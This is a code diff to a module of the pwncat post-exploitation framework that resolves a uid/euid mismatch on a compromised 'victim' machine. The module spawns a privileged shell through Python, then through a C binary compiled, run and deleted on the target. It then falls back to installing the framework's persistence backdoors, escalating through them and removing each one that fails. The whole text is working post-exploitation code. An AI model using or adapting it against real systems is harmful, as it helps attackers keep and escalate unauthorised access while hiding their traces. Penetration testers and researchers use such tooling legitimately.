@@ -37,97 +37,112 @@ class Command(CommandDefinition):
 
         ident = pwncat.victim.id
 
-        # Ensure we are actually EUID=0
-        if ident["euid"]["id"] != 0:
-            console.log("euid is not 0")
-            return
-
         # Check that UID != EUID
-        if ident["uid"]["id"] == 0:
+        if ident["uid"]["id"] == ident["euid"]["id"]:
             console.log("no euid/uid mismatch detected")
             return
 
-        # First try to escalate with python. This removes the need
-        # for any system modifications. Which will resolve a variety
-        # of python verions including "python2" and "python3".
-        python = pwncat.victim.which("python")
-        if python is not None:
-            console.log("attempting [yellow]python-based[/yellow] fix")
-            pwncat.victim.run(python, wait=False)
-            pwncat.victim.client.send(b"import os\n")
-            pwncat.victim.client.send(b"os.setuid(0)\n")
-            pwncat.victim.client.send(b"os.setgid(0)\n")
-            pwncat.victim.client.send(
-                f'os.system("{pwncat.victim.shell}")\n'.encode("utf-8")
-            )
-            time.sleep(0.5)
-
-            ident = pwncat.victim.id
-            if ident["uid"]["id"] == ident["euid"]["id"]:
-                console.log("euid/uid mismatch [green]corrected[/green]!")
-                pwncat.victim.reset(hard=False)
-                return
-
-            console.log("python-based fix [red]failed[/red]")
-
-        # Quick and simple UID=EUID fix
-        fix_source = textwrap.dedent(
-            """
-            #include <stdio.h>
-
-            int main(int argc, char** argv) {
-                setuid(0);
-                setgid(0);
-                execl("{0}", "{0}", NULL);
-            }
-        """.replace(
-                "{0}", pwncat.victim.shell
-            )
-        )
-
-        # See if we can compile it
-        try:
-            console.log("attempting [yellow]c-based[/yellow] fix")
-            remote_binary = pwncat.victim.compile([StringIO(fix_source)])
-            # Appears to have went well, try to execute
-            pwncat.victim.run(remote_binary, wait=False)
-
-            # Give it some time to catch up
-            time.sleep(0.5)
-
-            # Remove the binary
-            pwncat.victim.env(["rm", "-f", remote_binary])
-
-            ident = pwncat.victim.id
-            if ident["uid"]["id"] == ident["euid"]["id"]:
-                console.log("euid/uid corrected!")
-                pwncat.victim.reset(hard=False)
-                return
-        except CompilationError:
-            console.log(
-                "[yellow]warning[/yellow]: compilation failed, attempting persistence"
-            )
-
-        # Installation/removal of privilege escalation methods can take time,
-        # so we start a progress bar.
         with Progress(
+            "euid/uid fix",
+            "•",
             "[progress.description]{task.fields[status]}",
-            BarColumn(bar_width=None),
-            "[progress.percentage]{task.percentage:>3.0f}%",
-            TimeRemainingColumn(),
+            transient=True,
         ) as progress:
-            methods = list(pwncat.victim.persist.available)
-            task_id = progress.add_task("", total=len(methods), status="initializing")
-            for method in methods:
+
+            task = progress.add_task("", status="initializing")
+
+            # First try to escalate with python. This removes the need
+            # for any system modifications. Which will resolve a variety
+            # of python verions including "python2" and "python3".
+            python = pwncat.victim.which("python")
+            if python is not None:
                 progress.update(
-                    task_id,
-                    status=f"installing [yellow]{method.name}[/yellow]",
-                    advance=1,
+                    task, status="attempting [yellow]python-based[/yellow] fix"
+                )
+                pwncat.victim.run(python, wait=False)
+                pwncat.victim.client.send(b"import os\n")
+                pwncat.victim.client.send(
+                    f"os.setuid({ident['euid']['id']})\n".encode("utf-8")
+                )
+                pwncat.victim.client.send(
+                    f"os.setgid({ident['egid']['id']})\n".encode("utf-8")
+                )
+                pwncat.victim.client.send(
+                    f'os.system("{pwncat.victim.shell}")\n'.encode("utf-8")
+                )
+                time.sleep(0.5)
+
+                new_ident = pwncat.victim.id
+                if (
+                    new_ident["uid"]["id"] == new_ident["euid"]["id"]
+                    and new_ident["uid"]["id"] == ident["euid"]["id"]
+                ):
+                    progress.log(
+                        "euid/uid [green]corrected[/green] via [yellow]python-based[/yellow] fix!"
+                    )
+                    pwncat.victim.reset(hard=False)
+                    return
+
+                pwncat.victim.run("exit", wait=False)
+                pwncat.victim.client.send(b"quit()\n")
+                time.sleep(0.1)
+
+            # Quick and simple UID=EUID fix
+            fix_source = textwrap.dedent(
+                f"""
+                #include <stdio.h>
+
+                int main(int argc, char** argv) {{
+                    setuid({ident["euid"]["id"]});
+                    setgid({ident["egid"]["id"]});
+                    execl("{pwncat.victim.shell}", "{pwncat.victim.shell}", NULL);
+                }}
+            """
+            )
+
+            # See if we can compile it
+            try:
+                progress.update(task, status="attempting [yellow]c-based[/yellow] fix")
+                remote_binary = pwncat.victim.compile([StringIO(fix_source)])
+                # Appears to have went well, try to execute
+                pwncat.victim.run(remote_binary, wait=False)
+
+                # Give it some time to catch up
+                time.sleep(0.5)
+
+                # Remove the binary
+                pwncat.victim.env(["rm", "-f", remote_binary])
+
+                new_ident = pwncat.victim.id
+                if (
+                    new_ident["uid"]["id"] == new_ident["euid"]["id"]
+                    and new_ident["uid"]["id"] == ident["euid"]["id"]
+                ):
+                    progress.log("euid/uid corrected via [yellow]c-based[/yellow] fix!")
+                    pwncat.victim.reset(hard=False)
+                    return
+
+                pwncat.victim.run("exit", wait=False)
+            except CompilationError:
+                pass
+
+            # Installation/removal of privilege escalation methods can take time,
+            # so we start a progress bar.
+            methods = list(pwncat.victim.persist.available)
+            for method in methods:
+
+                if ident["euid"]["id"] != 0 and method.system:
+                    continue
+
+                progress.update(
+                    task, status=f"installing [yellow]{method.name}[/yellow]",
                 )
 
                 # Depending on the method type, we may need to specify a user
                 if method.system:
                     user = None
+                elif ident["euid"]["id"] != 0:
+                    user = ident["euid"]["name"]
                 else:
                     user = "root"
 
@@ -141,20 +156,21 @@ class Command(CommandDefinition):
                 try:
                     # Install succeeded, attempt to escalate
                     progress.update(
-                        task_id, status=f"[yellow]{method.name}[/yellow] installed"
+                        task, status=f"[yellow]{method.name}[/yellow] installed"
                     )
                     method.escalate(user)
                     pwncat.victim.reset(hard=False)
                     progress.update(
-                        task_id,
+                        task,
                         status=f"[yellow]{method.name}[/yellow] succeeded!",
                         completed=len(methods),
                     )
                     progress.log(
-                        f"[yellow]{method.name}[/yellow] succeeded; mismatch [green]fixed[/green]!"
+                        f"euid/uid [green]corrected[/green] via [yellow]{method.name}[/yellow]!"
                     )
-                    progress.update(task_id, visible=False)
                     break
                 except PersistenceError:
                     # Escalation failed, remove persistence :(
                     pwncat.victim.persist.remove(method.name, user)
+            else:
+                progress.log("[red]error[/red]: euid/uid fix failed")
